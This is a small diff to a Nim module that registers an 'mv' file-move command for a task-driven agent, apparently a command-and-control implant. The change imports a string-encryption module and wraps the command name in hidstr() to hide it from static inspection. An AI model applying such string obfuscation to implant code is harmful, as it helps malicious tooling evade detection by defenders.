@@ -1,6 +1,7 @@
 import std/[os, json, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc mvExecute(taskId: string, params: JsonNode, state: AgentState,
                send: SendMsg): TaskResult =
@@ -20,4 +21,4 @@ proc mvExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initMv*() =
-  register("mv", mvExecute)
+  register(hidstr("mv"), mvExecute)
